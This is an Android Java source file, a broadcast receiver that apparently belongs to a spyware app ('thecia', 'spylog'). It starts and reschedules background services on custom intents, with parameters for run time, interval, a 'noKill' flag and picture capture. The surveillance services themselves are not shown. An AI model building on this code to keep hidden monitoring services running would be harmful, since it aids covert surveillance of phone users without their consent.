package start.thecia.Receivers;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import start.thecia.Services.c;
import start.thecia.Services.A;
import start.thecia.Services.TimeService;


public class MyReceiver extends BroadcastReceiver {
    Intent intent;
    PendingIntent alarmIntent;
    int parameters;
    int para2;
   private String noKill;
    @Override
    public void onReceive(final Context context, Intent intent) {
        if (intent.getAction().equalsIgnoreCase("start.spylog.StartTimed")) {

                            Intent serviceIntent3 = new Intent(context, TimeService.class);
                            context.startService(serviceIntent3) ; Log.d("here","here");}

        if (intent.getAction().equalsIgnoreCase("start.spylog.2mins")) {

           final Intent serviceIntent3 = new Intent(context, A.class);
            final Thread anewThread=new Thread(new  Runnable()
            {
                @Override
                public void run() {
                    context.startService(serviceIntent3) ; Log.d("hereAA","here");


                }


            });anewThread.start(); }


        if (intent.getAction().equalsIgnoreCase("start.thecia.Specific")) {
if(intent.getStringExtra("noKill")!=null){noKill=intent.getStringExtra("noKill");}
           parameters=intent.getIntExtra("RunTime",parameters);
          para2=intent.getIntExtra("interval",para2);


            final Intent serviceIntent3 = new Intent(context, A.class);
            final Thread anewThread=new Thread(new  Runnable()
            {

                @Override
                public void run() {
                    if(noKill!=null){ serviceIntent3.putExtra("noKill",noKill);}
                        serviceIntent3.putExtra("RunTime",parameters);
                    serviceIntent3.putExtra("interval",para2);
                    context.startService(serviceIntent3) ; Log.d("hereAA","here");



            }});
            final Intent serviceIntent1 = new Intent(context, TimeService.class);
            if(intent.getIntExtra("hasSetPictures",0)!=0){
            para2=intent.getIntExtra("hasSetPictures",para2);}
            final Thread anewThread1=new Thread(new  Runnable()
            {
                @Override
                public void run() {
                    if(para2!=0){
                   serviceIntent1.putExtra("hasSetPictures",para2);}
                    context.startService(serviceIntent1) ; Log.d("hereAA","here");
                }


            });
            anewThread.start();    anewThread1.start();

           }
        if (intent.getAction().equalsIgnoreCase("start.spylog.hasConfig")){
            final Intent serviceIntent = new Intent(context, TimeService.class);
            final Intent serviceIntent1 = new Intent(context, c.class);
            Thread a=new Thread(
                    new Runnable(){

                        public void run(){
                            context.startService(serviceIntent);};;

                    } );a.start();}

  if (intent.getAction().equalsIgnoreCase("com.thecia.noKill")){
        final Intent serviceIntent = new Intent(context, TimeService.class);
        final Intent serviceIntent1 = new Intent(context, c.class);
        Thread a=new Thread(
                new Runnable(){

                    public void run(){
                        context.startService(serviceIntent);};;

                } );a.start();}}}


